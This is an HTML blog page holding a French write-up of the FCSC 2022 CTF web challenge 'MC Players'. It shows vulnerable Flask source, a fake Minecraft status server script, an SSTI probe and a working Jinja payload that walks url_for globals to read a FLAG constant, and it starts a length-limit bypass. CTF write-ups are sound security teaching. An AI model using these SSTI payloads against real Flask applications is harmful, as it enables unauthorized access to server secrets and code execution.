<!DOCTYPE html>
<html lang="en-us">
<head>
  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> FCSC2022 - MC Players | Itarow</title>
  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/fcsc2022-mc_players/'>
  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="FCSC2022 - MC Players" />
<meta property="og:description" content="FCSC 2022 - MC Players - Write-up Énoncé Cela fait plusieurs mois que le service de Dinnerbone permettant de récupérer
le statut d&rsquo;un serveur Minecraft n&rsquo;est plus actif. Nous avons donc décidé de proposer une alternative réutilisant sa librairie mcstatus.
https://mc-players.france-cybersecurity-challenge.fr/
Résolution Ici on se retrouve face à une appli web en white-box, c’est-à-dire que nous avons le code source de l’application à notre disposition. Cette application est développée en python avec le framework flask." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.itarow.xyz/posts/fcsc2022-mc_players/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-08T22:07:26+02:00" />
<meta property="article:modified_time" content="2022-05-08T22:07:26+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FCSC2022 - MC Players"/>
<meta name="twitter:description" content="FCSC 2022 - MC Players - Write-up Énoncé Cela fait plusieurs mois que le service de Dinnerbone permettant de récupérer
le statut d&rsquo;un serveur Minecraft n&rsquo;est plus actif. Nous avons donc décidé de proposer une alternative réutilisant sa librairie mcstatus.
https://mc-players.france-cybersecurity-challenge.fr/
Résolution Ici on se retrouve face à une appli web en white-box, c’est-à-dire que nous avons le code source de l’application à notre disposition. Cette application est développée en python avec le framework flask."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://blog.itarow.xyz/posts/bzhctf_des-deux-cotes-1/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://blog.itarow.xyz/posts/fcsc2022-r2d2/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&text=FCSC2022%20-%20MC%20Players" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&is_video=false&description=FCSC2022%20-%20MC%20Players" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=FCSC2022%20-%20MC%20Players&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&title=FCSC2022%20-%20MC%20Players" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&name=FCSC2022%20-%20MC%20Players&description=FCSC%202022%20-%20MC%20Players%20-%20Write-up%20%c3%89nonc%c3%a9%20Cela%20fait%20plusieurs%20mois%20que%20le%20service%20de%20Dinnerbone%20permettant%20de%20r%c3%a9cup%c3%a9rer%0ale%20statut%20d%26rsquo%3bun%20serveur%20Minecraft%20n%26rsquo%3best%20plus%20actif.%20Nous%20avons%20donc%20d%c3%a9cid%c3%a9%20de%20proposer%20une%20alternative%20r%c3%a9utilisant%20sa%20librairie%20mcstatus.%0ahttps%3a%2f%2fmc-players.france-cybersecurity-challenge.fr%2f%0aR%c3%a9solution%20Ici%20on%20se%20retrouve%20face%20%c3%a0%20une%20appli%20web%20en%20white-box%2c%20c%e2%80%99est-%c3%a0-dire%20que%20nous%20avons%20le%20code%20source%20de%20l%e2%80%99application%20%c3%a0%20notre%20disposition.%20Cette%20application%20est%20d%c3%a9velopp%c3%a9e%20en%20python%20avec%20le%20framework%20flask." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2ffcsc2022-mc_players%2f&t=FCSC2022%20-%20MC%20Players" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#énoncé">Énoncé</a></li>
    <li><a href="#résolution">Résolution</a>
      <ul>
        <li><a href="#serveur-minecraft">Serveur Minecraft</a></li>
        <li><a href="#ssti---lire-le-flag">SSTI - Lire le FLAG</a></li>
      </ul>
    </li>
    <li><a href="#liens-utiles">Liens utiles</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        FCSC2022 - MC Players
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-05-08 22:07:26 &#43;0200 CEST" itemprop="datePublished">2022-05-08</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          7 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/categories/fcsc2022">FCSC2022</a>
            
        </div>
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/web" rel="tag">Web</a>
            
             ,  
            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <h1 id="fcsc-2022---mc-players---write-up">FCSC 2022 - MC Players - Write-up</h1>
<h2 id="énoncé">Énoncé</h2>
<p>Cela fait plusieurs mois que le service de Dinnerbone permettant de récupérer</p>
<p>le statut d&rsquo;un serveur Minecraft n&rsquo;est plus actif. Nous avons donc décidé de proposer une alternative réutilisant sa librairie mcstatus.</p>
<p><a href="https://mc-players.france-cybersecurity-challenge.fr/">https://mc-players.france-cybersecurity-challenge.fr/</a></p>
<h2 id="résolution">Résolution</h2>
<p>Ici on se retrouve face à une appli web en white-box, c’est-à-dire que nous avons le code source de l’application à notre disposition. Cette application est développée en python avec le framework flask. C’est une application qui permet de récupérer le statut d’un serveur minecraft. Elle affiche son nombre de joueurs maximal, nombre de joueurs en ligne, ainsi que les pseudos des joueurs. Elle utilise pour cela la librairie mcstatus, comme dit dans l’énoncé.</p>
<p>Ici, comme nous sommes face à du flask, on réduit grandement les possibilités d’exploitation. On se réfère notamment à notre objectif, qui va être de lire le flag disposé en constante globale comme ceci :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> re
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> mcstatus <span style="color:#f92672">import</span> JavaServer
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, render_template, render_template_string, request
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://mc-players-flag:1337/&#39;</span>)<span style="color:#f92672">.</span>text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__, template_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./&#39;</span>)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#39;DEBUG&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span></code></pre></div><p>Le problème ici, est que premièrement nous pouvons penser que nous devons RCE, afin de récupérer le flag en émettant une requête depuis le serveur web. Hors, nous avons le code de l&rsquo;application exposée sur le port 1337. Voici le problème :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> HTTPServer, BaseHTTPRequestHandler
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SimpleHTTPRequestHandler</span>(BaseHTTPRequestHandler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>end_headers()
</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;FCSC</span><span style="color:#e6db74">{TEST_FLAG}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>httpd <span style="color:#f92672">=</span> HTTPServer((<span style="color:#e6db74">&#39;0.0.0.0&#39;</span>, <span style="color:#ae81ff">1337</span>), SimpleHTTPRequestHandler)
</span></span><span style="display:flex;"><span>httpd<span style="color:#f92672">.</span>serve_forever()
</span></span></code></pre></div><p>Ici, cette application permet de desservir le flag à l&rsquo;application flask, mais nous voyons le <code>exit(0)</code> qui va donc stopper le serveur, après avoir délivré le FLAG. Sur flask, il n&rsquo;y a pas énormément de failles exploitables, hors erreurs du développeur, mais la plus commune est la SSTI (Server Side Template Injection) (<a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)</a>. Cette faille exploite les templates qui sont utilisés dans flask par exemple. Le but de l&rsquo;attaquant va être d&rsquo;envoyer des paramètres malicieux afin d&rsquo;inclure sa propre template et pouvoir accéder à des objets ou bien même exécuter du code.</p>
<p>C&rsquo;est cette vulnérabilité qui est présente dans le code. On la trouve rapidement à cet endroit :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>    players <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> status<span style="color:#f92672">.</span>players<span style="color:#f92672">.</span>sample <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> player <span style="color:#f92672">in</span> status<span style="color:#f92672">.</span>players<span style="color:#f92672">.</span>sample:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>match(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;\w*&#39;</span>, player<span style="color:#f92672">.</span>name) <span style="color:#f92672">and</span> len(player<span style="color:#f92672">.</span>name) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">20</span>:
</span></span><span style="display:flex;"><span>                players<span style="color:#f92672">.</span>append(player<span style="color:#f92672">.</span>name)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    html_player_list <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;br&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;h3&gt;</span><span style="color:#e6db74">{</span>hostname<span style="color:#e6db74">}</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">{</span>len(players)<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>status<span style="color:#f92672">.</span>players<span style="color:#f92672">.</span>max<span style="color:#e6db74">}</span><span style="color:#e6db74">)&lt;/h3&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &lt;ul&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> player <span style="color:#f92672">in</span> players:
</span></span><span style="display:flex;"><span>        html_player_list <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;li&gt;&#39;</span> <span style="color:#f92672">+</span> player <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&lt;/li&gt;&#39;</span>
</span></span><span style="display:flex;"><span>        print(player)
</span></span><span style="display:flex;"><span>    html_player_list <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;&lt;/ul&gt;&#39;</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    results <span style="color:#f92672">=</span> render_template_string(html_player_list)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, results<span style="color:#f92672">=</span>results)
</span></span></code></pre></div><p>Ici, c&rsquo;est le code qui se charge d&rsquo;afficher et de formater les données reçues du serveur minecraft distant. C&rsquo;est au niveau du render_template_string qu&rsquo;il manque un paramètre : <code>**context</code>. Ce paramètre permet d&rsquo;éviter l&rsquo;interprétation des inputs utilisateur. Ici, si nous contrôlons les noms des joueurs par exemple, nous pourons donc exécuter du code ou accéder à la variable FLAG.</p>
<h3 id="serveur-minecraft">Serveur Minecraft</h3>
<p>Notre objectif est clair, il faut reproduire le comportement d&rsquo;un serveur minecraft, afin d&rsquo;envoyer des noms de joueurs malveillants, puis récupérer le FLAG. Pour cela, je suis parti sur l&rsquo;utilisation de wireshark en regardant les données envoyées et reçues entre un serveur minecraft et le client mcstatus, l&rsquo;idée est donc ensuite de reproduire ce comportement avec un faux serveur reproduisant le comportement d&rsquo;un vrai serveur minecraft.</p>
<p>Pour cela, j&rsquo;ai premièrement repris une image docker d&rsquo;un serveur minecraft basique : <a href="https://github.com/itzg/docker-minecraft-server">https://github.com/itzg/docker-minecraft-server</a> . On le lance et on utilise un script python utilisant la librairie avec de se connecter au serveur :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> mcstatus <span style="color:#f92672">import</span> JavaServer
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>hostname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">25565</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    ms <span style="color:#f92672">=</span> JavaServer(hostname, port)
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> ms<span style="color:#f92672">.</span>status()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;error&#34;</span>)
</span></span></code></pre></div><p>On lance une capture pcap avec tcpdump, lui on lance notre script : <code>sudo tcpdump -i any -w capture_ex.pcap</code>.</p>
<p><img src="/img/mc-players/1.png" alt=""></p>
<p>On observe la capture wireshark et on y apperçoit plusieurs phases. La première, le client mcstatus envoie de la data au serveur minecraft, (ici 002f096c6f63616c686f737463dd01), le serveur répond des données d&rsquo;entête, ainsi q&rsquo;un json contenant les informations du serveur, description, etc&hellip; Sur la capture on ne voit pas de joueurs car mon serveur local n&rsquo;avait aucun joueurs. J&rsquo;ai donc refais une capture avec un serveur en ligne, pour savoir le format des données des joueurs.</p>
<p>Voici le JSON basique répondu avec un joueur lambda :</p>
<pre tabindex="0"><code>{&#34;description&#34;:{&#34;text&#34;:&#34;Description&#34;},&#34;players&#34;:{&#34;max&#34;:20,&#34;online&#34;:1,&#34;sample&#34;:[{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;test&#34;}]},&#34;version&#34;:{&#34;name&#34;:&#34;1.18.2&#34;,&#34;protocol&#34;:758}}
</code></pre><p>Il faudra respecter les types de données sinon mcclient retournera une erreur. Ensuite, un dernier paquet de data est envoyé, il suffit de renvoyer la même chose et la connexion TCP est terminée. Les données présentes avant le JSON comprennent la longueur de la data envoyée. Je ne vais pas rentrer dans les détails de l&rsquo;entête mais de notre côté nous avons juste à légèrement adapter nos envoie d&rsquo;informations en spécifiant la bonne longueur pour nos données.</p>
<p>Désormais, il nous reste donc à reproduire ce schéma de connexion dans un script python qui enverra le JSON que nous voulons.</p>
<p>Le voici :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.12&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">55000</span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>bind((HOST, PORT))
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>listen()
</span></span><span style="display:flex;"><span>    conn, addr <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>accept()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> conn:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Connected by </span><span style="color:#e6db74">{</span>addr<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                data <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;recv data&#34;</span>,data<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># envoie données</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> <span style="color:#e6db74">&#34;002f0b38322e36362e35392e3731d6d8010100&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>hex():
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;send infos&#34;</span>)
</span></span><span style="display:flex;"><span>                    send <span style="color:#f92672">=</span> bytearray<span style="color:#f92672">.</span>fromhex(<span style="color:#e6db74">&#39;&#39;</span>) <span style="color:#75715e"># on envoie entête + json ici</span>
</span></span><span style="display:flex;"><span>                    conn<span style="color:#f92672">.</span>sendall(send)
</span></span><span style="display:flex;"><span>                    b <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">pass</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># coupure connexion</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;0901&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>hex():
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">&#34;Send : &#34;</span>,data<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>                    conn<span style="color:#f92672">.</span>sendall(data)
</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
</span></span></code></pre></div><p>Ce n&rsquo;est pas très élégant mais cela fait le travail.</p>
<p>On confirme la présence de la SSTI en envoyant un joueur avec pour nom {{7*7}}, qui est donc interprété par flask, il écrit donc 49 sur la page html. Voici la payload :</p>
<pre tabindex="0"><code>data = b&#39;&#39;&#39;{&#34;description&#34;:{&#34;text&#34;:&#34;&#34;},&#34;players&#34;:{&#34;max&#34;:2,&#34;online&#34;:1,&#34;sample&#34;:[{&#34;id&#34;:&#34;0&#34;,&#34;name&#34;:&#34;{{7*7}}&#34;}]},&#34;version&#34;:{&#34;name&#34;:&#34;1.18.2&#34;,&#34;protocol&#34;:758}}&#39;&#39;&#39;
</code></pre><p>On concatène ceci avec l&rsquo;entête grâce un petit script, on place nos données sur notre serveur, on lance le script et on place notre IP en input sur le serveur web.</p>
<p><img src="/img/mc-players/2.png" alt="">
<img src="/img/mc-players/3.png" alt=""></p>
<p>Parfait ! On obtient bien 49, il nous reste donc à exploiter la SSTI pour lire le FLAG.</p>
<h3 id="ssti---lire-le-flag">SSTI - Lire le FLAG</h3>
<p>Après être arrivé jusque-là, on peut se dire que c&rsquo;est facile et que on va trouver rapidement où la variable flag est, hors cela n&rsquo;a pas été mon cas. J&rsquo;ai cherché énormément de write-up et ce chall est très spécifique, c&rsquo;est le seul que j&rsquo;ai vu qui place FLAG en variable constante du programme. La plupart des autres challenges place FLAG dans la config flask qui se récupère facilement avec l&rsquo;injection <code>{{config}}</code> par exemple.</p>
<p>Deuxième point, nous sommes limités par une taille de 20 sur les noms des joueurs, nous allons donc devoir trouver un bypass, et même problème, aucun write-up vu sur internet n&rsquo;aborde la technique que nous allons utiliser, cela rendait une nouvelle fois plus complexe l&rsquo;exploitation.</p>
<p>En cherchant et en ne trouvant pas, le code de l&rsquo;application m&rsquo;a interpellé, en effet il y a cette fonction flag qui permet de récupérer le FLAG si notre IP est égale à 13.37.13.37 (:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/flag&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">flag</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>remote_addr <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;13.37.13.37&#39;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;Unauthorized IP address: &#39;</span> <span style="color:#f92672">+</span> request<span style="color:#f92672">.</span>remote_addr
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FLAG
</span></span></code></pre></div><p>On voit bien qu&rsquo;elle retourne FLAG. J&rsquo;ai donc continué de manipuler ma SSTI avec différentes injections jusqu&rsquo;à accéder aux variables de cette fonction. J&rsquo;ai finalement réussi à trouver cette payload :</p>
<p><code>{{url_for.__globals__.current_app.view_functions.flag.__globals__.FLAG}}</code></p>
<p>En passant par url_for, en récupérant l&rsquo;objet current_app, en allant voir la fonction flag et ses &ldquo;<strong>globals</strong>&rdquo;, on récupère la valeur de FLAG, c&rsquo;est tout bon.</p>
<p>Il nous reste donc désormais à bypass le check de longueur car notre payload fait bien plus que 20 caractères. L&rsquo;idée à donc été, en s&rsquo;inspirant de ce write-up : <a href="http://www.andynoel.xyz/?p=244">http://www.andynoel.xyz/?p=244</a> , de passer par les variables de Flask. En effet, on peut set des variables grace à ce pattern : <code>{%set x=&quot;Super_Variable&quot;%}</code> et on peut aussi directement y associer un objet : {%set b=url_for%}. L&rsquo;idée va donc être de combiner plusieurs variables entre elles, puis d&rsquo;appeler la variable finale sur notre injection classique avec &ldquo;{{}}&rdquo;.</p>
